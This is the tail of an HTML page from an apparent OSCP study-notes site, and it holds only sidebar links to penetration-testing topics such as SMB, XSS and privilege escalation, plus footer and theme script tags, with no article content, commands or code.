read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../js/js-yaml/js-yaml.min.js?1762285676 defer></script><script src=../../js/d3/d3-color.min.js?1762285676 defer></script><script src=../../js/d3/d3-dispatch.min.js?1762285676 defer></script><script src=../../js/d3/d3-drag.min.js?1762285676 defer></script><script src=../../js/d3/d3-ease.min.js?1762285676 defer></script><script src=../../js/d3/d3-interpolate.min.js?1762285676 defer></script><script src=../../js/d3/d3-selection.min.js?1762285676 defer></script><script src=../../js/d3/d3-timer.min.js?1762285676 defer></script><script src=../../js/d3/d3-transition.min.js?1762285676 defer></script><script src=../../js/d3/d3-zoom.min.js?1762285676 defer></script><script src=../../js/mermaid/mermaid.min.js?1762285676 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../js/clipboard/clipboard.min.js?1762285676 defer></script><script src=../../js/perfect-scrollbar/perfect-scrollbar.min.js?1762285676 defer></script><script src=../../js/theme.min.js?1762285676 defer></script></body></html>